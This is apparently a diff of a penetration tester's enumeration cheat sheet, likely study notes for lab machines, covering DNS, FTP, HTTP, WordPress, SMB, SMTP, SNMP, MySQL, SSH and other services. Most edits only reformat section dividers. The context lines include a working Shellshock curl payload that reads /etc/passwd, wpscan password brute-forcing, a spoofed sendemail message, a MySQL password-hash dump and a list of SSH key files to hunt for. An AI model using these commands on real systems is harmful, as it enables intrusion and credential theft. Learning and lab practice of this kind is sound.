@@ -1,7 +1,7 @@
-                                                    ENUMERATION
---------------------------------------------------------------------------------------------------------------------------------
+		                                                    ENUMERATION
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-                                                        DNS
+                	                                                DNS
 find ip addresses of primary name servers for domains:
 dig NS witrap.com @$ip
 
@@ -44,8 +44,10 @@ dig NS @<DNS_IP> <DOMAIN>      #DNS that resolves that name
 dig -x 192.168.0.2 @<DNS_IP>   #Reverse lookup
 dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup
 
---------------------------------------------------------------------------------------------------------------------------------
-                                                         FTP
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+FTP
+
 The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client and server on a computer network.
 It is a plain-text protocol that uses as new line character 0x0d 0x0a so it's important to connect using telnet instead of nc.
 
@@ -92,8 +94,10 @@ ftp bounce:
 nmap -vvvv -P0 -n -b 10.11.1.125A 10.11.1.125B -p-
 
 
---------------------------------------------------------------------------------------------------------------------------------
-                                                        HTTP
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------HTTP
+
+HTTP
+
 ask yourself:
   what does the application do
   what language is it written in 
@@ -206,7 +210,10 @@ shellshock exploit:
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable
 
----------------------------------------------------WordPress------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+WordPress
+
 enumerate Wordpress users
 wpscan --url http://10.10.10.2 --enumerate u
 
@@ -224,7 +231,9 @@ wpscan --url http://10.11.1.234/wp-login --usernames Core,Backup,admin --passwor
 
 wpscan --url http://10.141.1.251/wp --enumerate vp,u,vt --plugins-detection aggressive
 
---------------------------------------------------------------------- Drupal ---------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+
+Drupal 
 
 to enumerate drupal use droopescan:
 ./droopescan --help
@@ -235,7 +244,10 @@ one of the default files in drupal is changelog.txt browse it and you could get 
 http://10.10.10.9/CHANGELOG.txt
 
 
------------------------------------------------------ NFS -------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+
+NFS
+
 scanning nfs with nmap:
 nmap -sV --script=nfs-* $ip
 nmap -sV --script=nfs-ls $ip //same result as rpcinfo
@@ -267,7 +279,10 @@ https://pentestlab.blog/tag/rpc/
 See root squashing
 https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/
 
------------------------------------------------- SMB -----------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+
+SMB
+
 smb vuln scan:
 nmap -Pn --script=smb-vuln* $ip
 
@@ -377,12 +392,14 @@ Smbmap -R Replication -H 10.10.10.100
 This command will download group xml and do it in quite mode because of the -q parameter 
 Smbmap -R replication -H 10.10.10.100 -A Groups.xml -q. 
 
-
 The command gpp-decrypt helps decrypt strings 
 With smbclient mget* downloads every file
 Smbmap -d active.htb -u svc_tgs -p password -H 10.10.10.100 - this command will log in with the username and password specified 
 
------------------------------------------------------ SMTP -------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+
+SMTP
+
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
 
 always connect with netcat to view relevant information:
@@ -420,7 +437,10 @@ telnet 192.186.235.3 25
 send a fake mail to root user using sendmail command:
 ​sendemail -f admin@attacker.xyz -t root@victim-1 -s 192.186.235.3 -u Fakemail -m "Hi root, a fake from admin" -o tls=no
 
--------------------------------------------------------- SNMP ---------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+
+SNMP 
+
 
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd 10.11.1.241
 
@@ -462,7 +482,10 @@ onesixtyone -c names -i hosts
 SNMPv3 Enumeration
 nmap -sV -p 161 --script=snmp-info $ip/24
 
------------------------------------------------- Mysql -----------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+
+Mysql
+
 we can access a remote mysql database with this command:
 mysql -h 192.154.94.3 -u root -ppassword
 
@@ -537,8 +560,10 @@ SELECT User,Host,authentication_string FROM mysql.user;
 
 mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
 
------------------------------------------------------- SSH -------------------------------------------------------------------
+SSH 
+
 banner grabbing:
 nc -vn <IP> 22
 
@@ -553,8 +578,10 @@ ssh_known_hosts
 known_hosts
 id_rsa
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
-									RPC
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+									
+RPC
+
 port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. 
 When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 
 
